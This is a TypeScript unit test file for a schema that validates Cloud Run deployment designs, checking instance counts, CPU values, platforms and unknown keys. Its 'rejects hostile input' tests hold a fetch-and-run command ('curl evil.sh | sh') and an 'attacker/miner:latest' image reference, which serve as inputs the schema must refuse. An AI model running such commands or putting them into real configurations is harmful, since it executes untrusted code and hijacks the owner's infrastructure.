import { designSchema } from './schema';

const validDesign = {
  schema_version: 1,
  api: {
    platform: 'cloudrun',
    min_instances: 1,
    max_instances: 10,
    concurrency: 80,
    cpu: 1,
    memory: '1Gi',
  },
  workers: {
    placement: 'separate_service',
    min_instances: 1,
  },
  cache: { enabled: true, tier: 'basic-1gb' },
  db: { tier: 'small' },
};

describe('designSchema', () => {
  it('accepts a valid Cloud Run design', () => {
    const result = designSchema.safeParse(validDesign);
    expect(result.success).toBe(true);
  });

  it('exposes the parsed values with correct types', () => {
    const result = designSchema.parse(validDesign);
    expect(result.api.platform).toBe('cloudrun');
    expect(result.api.min_instances).toBe(1);
    expect(result.workers.placement).toBe('separate_service');
    expect(result.cache.enabled).toBe(true);
    expect(result.db.tier).toBe('small');
  });
});

describe('designSchema rejects hostile input', () => {
  const withApi = (api: Record<string, unknown>) => ({
    ...validDesign,
    api: { ...validDesign.api, ...api },
  });

  it('rejects unknown top-level keys', () => {
    const result = designSchema.safeParse({
      ...validDesign,
      provisioner: { command: 'curl evil.sh | sh' },
    });
    expect(result.success).toBe(false);
  });

  it('rejects unknown keys inside api', () => {
    const result = designSchema.safeParse(withApi({ image: 'attacker/miner:latest' }));
    expect(result.success).toBe(false);
  });

  it('rejects a container image reference anywhere', () => {
    const result = designSchema.safeParse({
      ...validDesign,
      workers: { ...validDesign.workers, image: 'attacker/miner:latest' },
    });
    expect(result.success).toBe(false);
  });

  it('rejects out-of-range instance counts', () => {
    expect(designSchema.safeParse(withApi({ max_instances: 500 })).success).toBe(false);
    expect(designSchema.safeParse(withApi({ min_instances: -1 })).success).toBe(false);
  });

  it('rejects non-integer instance counts', () => {
    expect(designSchema.safeParse(withApi({ min_instances: 1.5 })).success).toBe(false);
  });

  it('rejects cpu values outside the allowed set', () => {
    expect(designSchema.safeParse(withApi({ cpu: 8 })).success).toBe(false);
    expect(designSchema.safeParse(withApi({ cpu: 0.25 })).success).toBe(false);
  });

  it('rejects an unknown platform', () => {
    expect(designSchema.safeParse(withApi({ platform: 'ec2' })).success).toBe(false);
  });

  it('rejects gke until a later milestone adds it', () => {
    expect(designSchema.safeParse(withApi({ platform: 'gke' })).success).toBe(false);
  });

  it('rejects a missing or wrong schema_version', () => {
    const { schema_version, ...withoutVersion } = validDesign;
    expect(designSchema.safeParse(withoutVersion).success).toBe(false);
    expect(designSchema.safeParse({ ...validDesign, schema_version: 99 }).success).toBe(false);
  });

  it('rejects max_instances below min_instances', () => {
    const result = designSchema.safeParse(
      withApi({ min_instances: 5, max_instances: 2 }),
    );
    expect(result.success).toBe(false);
  });

  it('rejects a string where a number is required', () => {
    expect(designSchema.safeParse(withApi({ min_instances: '1' })).success).toBe(false);
  });

  it('rejects null and array roots', () => {
    expect(designSchema.safeParse(null).success).toBe(false);
    expect(designSchema.safeParse([validDesign]).success).toBe(false);
  });
});
